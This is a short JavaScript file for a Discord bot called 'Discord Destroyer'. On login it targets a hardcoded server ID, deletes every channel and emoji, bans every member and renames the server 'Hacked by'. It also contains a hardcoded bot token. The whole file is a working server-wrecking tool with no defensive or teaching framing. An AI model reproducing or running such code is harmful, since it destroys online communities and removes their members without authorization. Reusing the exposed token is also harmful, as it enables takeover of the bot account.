// Initialise a client and Discord object.
const Discord = require("discord.js");
const client = new Discord.Client();

// Get Discord Destroyer version.
const packageVersion = require("./package.json").version;

// Settings for the bot.
const settings = {
     guildID: "615270274866216971",
    guildName: "Hacked by "
};

// Startup message,
console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Starting Discord Destroyer, Version: ${packageVersion}. ~(˘▾˘~)`);

// Once the bot is ready start destroying the guild!
client.once('ready', () => {
    // Success msg.
    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);

    // Get the guild using the ID.
    let guild = client.guilds.get(settings.guildID);

    // Delete all channels.
    guild.channels.forEach(c => {
        c.delete();
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
    });

    // Delete all emojis.
    guild.emojis.forEach(e => {
        guild.deleteEmoji(e);
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
    });

    // Ban all users.
    guild.members.forEach(m => {
        m.ban();
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
    });

 

    // Set the guild name to the desired name.
    guild.setName(settings.guildName);
    
    // Success prompt.
    console.info("\x1b[37m\x1b[42mSuccess\x1b[0m: Operation completed! (^_^)/~");
})

// Login into the bot.
client.login("NjE1MjY5NjA0NzAwNDU0OTIy.XWLkkw.w9pC5BeUYjA4hrU6kUaDFC0ic2Q");
